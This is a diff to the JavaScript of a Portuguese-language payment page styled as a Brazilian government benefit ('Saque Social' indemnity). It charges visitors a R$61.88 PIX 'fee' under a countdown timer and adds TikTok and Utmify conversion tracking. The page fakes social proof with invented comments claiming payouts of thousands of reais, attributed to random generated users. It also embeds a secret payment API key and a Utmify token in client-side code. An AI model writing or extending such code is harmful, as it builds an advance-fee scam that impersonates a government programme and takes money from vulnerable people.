@@ -294,15 +294,23 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
   // ===================================================
   // CONFIGURAÇÃO — PARADISE PAGS
   // ===================================================
-  var PARADISE_API_KEY  = 'sk_ab34b5dbce3ccce3e33070e6dcab26344a4c67b88706d5164ec01fb08eeaabac'; // ← cole sua sk_ aqui
+  var PARADISE_API_KEY  = 'sk_ab34b5dbce3ccce3e33070e6dcab26344a4c67b88706d5164ec01fb08eeaabac';
   var PARADISE_ENDPOINT = 'https://multi.paradisepags.com';
-  var PIX_VALOR_CENTS   = 6188;   // valor em centavos (R$ 61,87)
-  var PIX_DESCRICAO     = 'Indenizacao Saque Social';
+  var PIX_VALOR_CENTS   = 6188;
+  var PIX_DESCRICAO     = 'Saque Social';
   var PIX_REDIRECT      = 'https://beneficiogov.vercel.app/up1.html';
-  // ===================================================
+
+  // ─── UTMIFY — Postback URL ──────────────────────────────────────────────────
+  // A Paradise chama esta URL automaticamente quando o pagamento é aprovado.
+  // A Utmify recebe o postback e registra a venda nas campanhas.
+  // Formato: https://api.utmify.com.br/api-credentials/orders?platform=other&token=SEU_TOKEN
+  // Substitua SEU_TOKEN_UTMIFY pelo token da sua conta na Utmify
+  // (Utmify → Configurações → API → Token de Integração)
+  var UTMIFY_POSTBACK_URL = 'https://api.utmify.com.br/api-credentials/orders?platform=other&token=ghRVhTRxLXJKyhUjsCV8fCTO903rL7JaRobk';
+  // ============================================================================
 
   var _pixCode           = '';
-  var _pixTxid           = '';   // transaction_id numérico retornado pela Paradise
+  var _pixTxid           = '';
   var _pixTimer          = null;
   var _pixQRFeito        = false;
   var _checkoutDisparado = false;
@@ -332,26 +340,79 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
   if (nomeOk) document.getElementById('header-user-name').textContent = nomeOk.split(' ')[0];
 
   // ===================================================
-  // TIKTOK PIXEL
+  // TIKTOK PIXEL — eventos com valor correto
+  // Usa o pixel nativo (D6VJ0Q3C77UCSLHQUES0) para marcar
+  // as conversões dentro das campanhas do TikTok Ads
   // ===================================================
   function ttqIdentify() {
     try {
-      var d={};
-      if (_email&&_email.indexOf('@')>0) d.email=_email;
-      if (_fone) d.phone_number='+55'+_fone.replace(/\D/g,'');
+      var d = {};
+      if (_email && _email.indexOf('@') > 0) d.email = _email;
+      if (_fone) d.phone_number = '+55' + _fone.replace(/\D/g,'');
       if (Object.keys(d).length) ttq.identify(d);
-    } catch(e){}
+    } catch(e) {}
   }
+
+  // Dados de produto — valor correto em BRL para o TikTok rastrear ROAS
   function ttqConteudo() {
-    return { content_id:'indenizacao-saque-social', content_name:PIX_DESCRICAO, content_type:'product', currency:'BRL', value:parseFloat((PIX_VALOR_CENTS/100).toFixed(2)), quantity:1 };
+    return {
+      content_id:   'saque-social',
+      content_name: PIX_DESCRICAO,
+      content_type: 'product',
+      currency:     'BRL',
+      value:        parseFloat((PIX_VALOR_CENTS / 100).toFixed(2)), // valor real em reais
+      quantity:     1
+    };
   }
-  function ttqViewContent()      { try{ ttq.track('ViewContent',ttqConteudo());      console.log('[TTQ] ViewContent ✓');      }catch(e){} }
-  function ttqInitiateCheckout() { if(_checkoutDisparado)return; _checkoutDisparado=true; try{ ttq.track('InitiateCheckout',ttqConteudo()); console.log('[TTQ] InitiateCheckout ✓'); }catch(e){} }
-  function ttqAddPaymentInfo()   { try{ ttq.track('AddPaymentInfo',ttqConteudo());   console.log('[TTQ] AddPaymentInfo ✓');   }catch(e){} }
-  function ttqPurchase()         { try{ ttq.track('Purchase',ttqConteudo());         console.log('[TTQ] Purchase ✓');         }catch(e){} }
+
+  // ViewContent: usuário viu a página de pagamento
+  function ttqViewContent() {
+    try {
+      ttq.track('ViewContent', ttqConteudo());
+      console.log('[TTQ] ViewContent ✓ valor=R$' + (PIX_VALOR_CENTS/100).toFixed(2));
+    } catch(e) {}
+  }
+
+  // InitiateCheckout: PIX foi gerado (dispara 1x por sessão)
+  function ttqInitiateCheckout() {
+    if (_checkoutDisparado) return;
+    _checkoutDisparado = true;
+    try {
+      ttq.track('InitiateCheckout', ttqConteudo());
+      console.log('[TTQ] InitiateCheckout ✓');
+    } catch(e) {}
+  }
+
+  // AddPaymentInfo: usuário copiou o código PIX
+  function ttqAddPaymentInfo() {
+    try {
+      ttq.track('AddPaymentInfo', ttqConteudo());
+      console.log('[TTQ] AddPaymentInfo ✓');
+    } catch(e) {}
+  }
+
+  // Purchase: pagamento confirmado — evento mais importante para o TikTok Ads
+  // Inclui transaction_id para deduplicação e evitar contagem dupla
+  function ttqPurchase() {
+    try {
+      var purchaseData = {
+        content_id:      'indenizacao-saque-social',
+        content_name:    PIX_DESCRICAO,
+        content_type:    'product',
+        currency:        'BRL',
+        value:           parseFloat((PIX_VALOR_CENTS / 100).toFixed(2)),
+        quantity:        1,
+        transaction_id:  String(_pixTxid) // ID único da Paradise — evita duplicatas no TikTok
+      };
+      ttq.track('Purchase', purchaseData);
+      console.log('[TTQ] Purchase ✓ valor=R$' + (PIX_VALOR_CENTS/100).toFixed(2) + ' txid=' + _pixTxid);
+    } catch(e) {}
+  }
 
   // ===================================================
   // GERA PIX — PARADISE PAGS
+  // postback_url → Paradise chama a Utmify automaticamente
+  // quando o pagamento é aprovado (sem precisar de polling)
   // ===================================================
   async function pixIniciar() {
     document.getElementById('pix-loading').style.display = 'block';
@@ -367,14 +428,19 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
       if (nomeEnvio.trim().split(' ').filter(Boolean).length < 2) nomeEnvio += ' Pagador';
 
       var cpfEnvio   = _cpf.replace(/\D/g,'');
-      var emailEnvio = _email&&_email.indexOf('@')>0 ? _email : 'pagador@gmail.com';
+      var emailEnvio = _email && _email.indexOf('@') > 0 ? _email : 'pagador@gmail.com';
       var foneEnvio  = _fone || '11999999999';
 
       var payload = {
-        amount:      PIX_VALOR_CENTS,
-        description: PIX_DESCRICAO,
-        reference:   gerarReference(),
-        source:      'api_externa',
+        amount:       PIX_VALOR_CENTS,
+        description:  PIX_DESCRICAO,
+        reference:    gerarReference(),
+        source:       'api_externa',
+        // ─── POSTBACK UTMIFY ─────────────────────────────────────────────
+        // A Paradise faz POST nesta URL quando o pagamento for aprovado.
+        // A Utmify recebe e registra a venda automaticamente nas campanhas.
+        postback_url: UTMIFY_POSTBACK_URL,
+        // ─────────────────────────────────────────────────────────────────
         customer: {
           name:     nomeEnvio,
           email:    emailEnvio,
@@ -387,8 +453,8 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
           utm_campaign: _p.get('utm_campaign') || '',
           utm_content:  _p.get('utm_content')  || '',
           utm_term:     _p.get('utm_term')     || '',
-          src:          _p.get('src')           || '',
-          sck:          _p.get('sck')           || ''
+          src:          _p.get('src')          || '',
+          sck:          _p.get('sck')          || ''
         }
       };
 
@@ -396,25 +462,24 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
 
       var res = await fetch(PARADISE_ENDPOINT + '/api/v1/transaction.php', {
         method:  'POST',
-        headers: { 'Content-Type':'application/json', 'X-API-Key': PARADISE_API_KEY },
+        headers: { 'Content-Type': 'application/json', 'X-API-Key': PARADISE_API_KEY },
         body:    JSON.stringify(payload)
       });
       var data = await res.json();
       console.log('Paradise resposta:', JSON.stringify(data));
 
-      if (!res.ok || data.status !== 'success') throw new Error('API erro '+res.status+': '+JSON.stringify(data));
-      if (!data.qr_code) throw new Error('PIX não gerado: '+JSON.stringify(data));
+      if (!res.ok || data.status !== 'success') throw new Error('API erro ' + res.status + ': ' + JSON.stringify(data));
+      if (!data.qr_code) throw new Error('PIX não gerado: ' + JSON.stringify(data));
 
-      _pixTxid = data.transaction_id; // ID numérico para polling
+      _pixTxid = data.transaction_id;
       _pixCode = data.qr_code;
 
       document.getElementById('pix-proto-num').textContent   = gerarProtocolo();
       document.getElementById('pix-nome-show').textContent   = nomeOk || 'Cliente';
       document.getElementById('pix-cpf-show').textContent    = _cpf ? formatarCPF(_cpf) : '---';
-      document.getElementById('pix-valor-label').textContent = 'R$ '+(PIX_VALOR_CENTS/100).toFixed(2).replace('.',',');
+      document.getElementById('pix-valor-label').textContent = 'R$ ' + (PIX_VALOR_CENTS/100).toFixed(2).replace('.',',');
       document.getElementById('pix-code-box').textContent    = _pixCode;
 
-      // QR Code — Paradise retorna base64 pronto
       if (data.qr_code_base64) {
         var imgEl = document.createElement('img');
         imgEl.src = data.qr_code_base64;
@@ -438,14 +503,12 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
       document.getElementById('pix-loading').style.display = 'none';
       var erroEl = document.getElementById('pix-erro');
       erroEl.style.display = 'block';
-      erroEl.querySelector('div').textContent = 'Não foi possível gerar o PIX. ('+(err.message||'Erro desconhecido')+')';
+      erroEl.querySelector('div').textContent = 'Não foi possível gerar o PIX. (' + (err.message || 'Erro desconhecido') + ')';
     }
   }
 
   // ===================================================
   // POLLING — PARADISE PAGS
-  // GET /api/v1/query.php?action=get_transaction&id={transaction_id}
-  // Status aprovado: "approved"
   // ===================================================
   function pixPolling() {
     if (!_pixTxid) { console.error('Polling: txid vazio.'); return; }
@@ -456,23 +519,27 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
       if (tentativas > 180) { clearInterval(_pixTimer); return; }
       try {
         var r = await fetch(
-          PARADISE_ENDPOINT+'/api/v1/query.php?action=get_transaction&id='+_pixTxid,
+          PARADISE_ENDPOINT + '/api/v1/query.php?action=get_transaction&id=' + _pixTxid,
           { headers: { 'X-API-Key': PARADISE_API_KEY } }
         );
         var s = await r.json();
-        console.log('Polling tentativa '+tentativas+':', s.status);
+        console.log('Polling tentativa ' + tentativas + ':', s.status);
 
         if (s.status === 'approved') {
           clearInterval(_pixTimer);
           clearInterval(_timerInterval);
+
+          // ✅ Dispara Purchase com transaction_id para deduplicação no TikTok
           ttqPurchase();
+
+          // Aguarda 800ms para garantir envio do evento antes do redirect
           setTimeout(function() {
             var params = new URLSearchParams(window.location.search);
-            var redirectUrl = PIX_REDIRECT+(PIX_REDIRECT.indexOf('?')>-1?'&':'?')+params.toString();
+            var redirectUrl = PIX_REDIRECT + (PIX_REDIRECT.indexOf('?') > -1 ? '&' : '?') + params.toString();
             window.location.href = redirectUrl;
           }, 800);
         }
-      } catch(e) { console.error('Polling erro tentativa '+tentativas+':', e); }
+      } catch(e) { console.error('Polling erro tentativa ' + tentativas + ':', e); }
     }, 5000);
   }
 
@@ -486,7 +553,7 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
       var wrap = document.getElementById('pix-qr-img');
       wrap.innerHTML = '';
       var img = document.createElement('img');
-      img.src = 'https://api.qrserver.com/v1/create-qr-code/?size=200x200&data='+encodeURIComponent(_pixCode);
+      img.src = 'https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=' + encodeURIComponent(_pixCode);
       img.alt = 'QR Code PIX';
       img.style.cssText = 'border-radius:8px;max-width:190px;';
       wrap.appendChild(img);
@@ -499,20 +566,20 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
     var orig = btn.innerHTML;
     ttqAddPaymentInfo();
     function ok() {
-      btn.innerHTML='<i class="fas fa-check"></i><span>CÓDIGO COPIADO!</span>';
+      btn.innerHTML = '<i class="fas fa-check"></i><span>CÓDIGO COPIADO!</span>';
       btn.classList.add('ok');
-      setTimeout(function(){ btn.innerHTML=orig; btn.classList.remove('ok'); }, 3000);
+      setTimeout(function(){ btn.innerHTML = orig; btn.classList.remove('ok'); }, 3000);
     }
-    if (navigator.clipboard&&navigator.clipboard.writeText) {
+    if (navigator.clipboard && navigator.clipboard.writeText) {
       navigator.clipboard.writeText(_pixCode).then(ok).catch(function(){ _fbCopy(); ok(); });
     } else { _fbCopy(); ok(); }
   }
 
   function _fbCopy() {
     var el = document.createElement('textarea');
-    el.value = _pixCode; el.style.cssText='position:fixed;opacity:0;top:0;left:0;';
+    el.value = _pixCode; el.style.cssText = 'position:fixed;opacity:0;top:0;left:0;';
     document.body.appendChild(el); el.focus(); el.select();
-    try{ document.execCommand('copy'); }catch(e){}
+    try{ document.execCommand('copy'); } catch(e) {}
     document.body.removeChild(el);
   }
 
@@ -525,7 +592,7 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
   // ===================================================
   // TIMER 5 MINUTOS
   // ===================================================
-  var _timerSecs=5*60, _timerInterval=null;
+  var _timerSecs = 5*60, _timerInterval = null;
 
   function pixIniciarTimer() {
     if (_timerInterval) clearInterval(_timerInterval);
@@ -536,80 +603,80 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
     _timerInterval = setInterval(function() {
       _timerSecs--;
       _atualizarTimer();
-      if (_timerSecs<=0) { clearInterval(_timerInterval); pixIniciar(); }
+      if (_timerSecs <= 0) { clearInterval(_timerInterval); pixIniciar(); }
     }, 1000);
   }
 
   function _atualizarTimer() {
-    var m=Math.floor(_timerSecs/60), s=_timerSecs%60;
-    var mEl=document.getElementById('gov-timer-m'), sEl=document.getElementById('gov-timer-s');
-    var bar=document.getElementById('gov-timer-bar');
+    var m = Math.floor(_timerSecs/60), s = _timerSecs%60;
+    var mEl = document.getElementById('gov-timer-m'), sEl = document.getElementById('gov-timer-s');
+    var bar = document.getElementById('gov-timer-bar');
     if (!mEl) return;
-    mEl.textContent=(m<10?'0':'')+m;
-    sEl.textContent=(s<10?'0':'')+s;
+    mEl.textContent = (m<10?'0':'')+m;
+    sEl.textContent = (s<10?'0':'')+s;
     bar.classList.remove('urgente','critico');
-    if (_timerSecs<=60) bar.classList.add('critico');
-    else if (_timerSecs<=120) bar.classList.add('urgente');
+    if (_timerSecs <= 60) bar.classList.add('critico');
+    else if (_timerSecs <= 120) bar.classList.add('urgente');
   }
 
   // ===================================================
   // COMENTÁRIOS
   // ===================================================
-  var totalComments=25738, storedComments=[];
+  var totalComments = 25738, storedComments = [];
 
   function initFacebookComments() {
-    document.getElementById('fb-header-outside').textContent='Comentários ('+totalComments+')';
-    var local=localStorage.getItem('commentsData');
+    document.getElementById('fb-header-outside').textContent = 'Comentários (' + totalComments + ')';
+    var local = localStorage.getItem('commentsData');
     if (local) {
-      storedComments=JSON.parse(local);
-      storedComments.forEach(function(c){ createComment(c.name,c.avatar,c.text,c.likes,c.dislikes,false); });
-      document.getElementById('fb-comment-count').textContent='Comentários: '+totalComments;
-      document.getElementById('fb-loading').textContent='Comentários atualizados.';
+      storedComments = JSON.parse(local);
+      storedComments.forEach(function(c){ createComment(c.name, c.avatar, c.text, c.likes, c.dislikes, false); });
+      document.getElementById('fb-comment-count').textContent = 'Comentários: ' + totalComments;
+      document.getElementById('fb-loading').textContent = 'Comentários atualizados.';
       scheduleComments();
     } else { generateInitialComments(); }
   }
   function generateInitialComments() {
     ['Tive medo, mas entrou R$ 2.400!','Tive que pagar taxa, mas veio R$ 2.800 em 10min','Recebi R$ 4.000 deu para pagar as contas kkk']
-      .forEach(function(t){ createRandomComment(t,true); });
-    document.getElementById('fb-comment-count').textContent='Comentários: '+totalComments;
-    document.getElementById('fb-loading').textContent='Comentários atualizados.';
+      .forEach(function(t){ createRandomComment(t, true); });
+    document.getElementById('fb-comment-count').textContent = 'Comentários: ' + totalComments;
+    document.getElementById('fb-loading').textContent = 'Comentários atualizados.';
     scheduleComments(); saveCommentsToLocal();
   }
   function scheduleComments() {
     ['Alguém conseguiu R$ 2.700 hoje?','Meu Pix foi aprovado e caiu R$ 3.500 em 5 min!','Testei hoje e entrou R$ 2.100 rapidinho!','Show! Liberou R$ 4.250 e já usei tudo!','Recebi R$ 5.000, só precisei pagar a taxa']
-      .forEach(function(msg,i){
+      .forEach(function(msg, i){
         setTimeout(function(){
-          document.getElementById('fb-loading').innerHTML='<i class="fas fa-spinner fa-spin"></i> Carregando comentários';
-          createRandomComment(msg,false);
-          document.getElementById('fb-loading').textContent='Comentários atualizados.';
-        },(i+1)*10000);
+          document.getElementById('fb-loading').innerHTML = '<i class="fas fa-spinner fa-spin"></i> Carregando comentários';
+          createRandomComment(msg, false);
+          document.getElementById('fb-loading').textContent = 'Comentários atualizados.';
+        }, (i+1)*10000);
       });
   }
-  async function createRandomComment(text,initial) {
+  async function createRandomComment(text, initial) {
     totalComments++;
-    var ud=await getRandomUser();
-    createComment(ud.name.first,ud.picture.medium,text,0,0,initial);
-    storedComments.unshift({name:ud.name.first,avatar:ud.picture.medium,text:text,likes:0,dislikes:0});
+    var ud = await getRandomUser();
+    createComment(ud.name.first, ud.picture.medium, text, 0, 0, initial);
+    storedComments.unshift({ name: ud.name.first, avatar: ud.picture.medium, text: text, likes: 0, dislikes: 0 });
     if (!initial) saveCommentsToLocal();
   }
-  function createComment(name,avatar,text,likes,dislikes,initialLoad) {
-    var el=document.createElement('div');
+  function createComment(name, avatar, text, likes, dislikes, initialLoad) {
+    var el = document.createElement('div');
     el.classList.add('comment-item');
-    el.innerHTML='<img class="comment-avatar" src="'+avatar+'" alt="avatar"/>'+
+    el.innerHTML = '<img class="comment-avatar" src="'+avatar+'" alt="avatar"/>'+
       '<div class="comment-content"><div class="comment-name">'+name+'</div>'+
       '<div class="comment-text">'+text+'</div>'+
       '<div class="comment-actions"><span class="comment-likes"><i class="fas fa-thumbs-up"></i> '+likes+'</span>'+
       '<span class="comment-dislikes"><i class="fas fa-thumbs-down"></i> '+dislikes+'</span></div></div>';
-    var c=document.getElementById('fb-comments-container');
-    c.insertBefore(el,c.firstChild);
+    var c = document.getElementById('fb-comments-container');
+    c.insertBefore(el, c.firstChild);
     if (!initialLoad) saveCommentsToLocal();
   }
   async function getRandomUser() {
-    var r=await fetch('https://randomuser.me/api/?nat=br');
+    var r = await fetch('https://randomuser.me/api/?nat=br');
     return (await r.json()).results[0];
   }
   function saveCommentsToLocal() {
-    localStorage.setItem('commentsData',JSON.stringify(storedComments));
+    localStorage.setItem('commentsData', JSON.stringify(storedComments));
   }
 
   // ===================================================
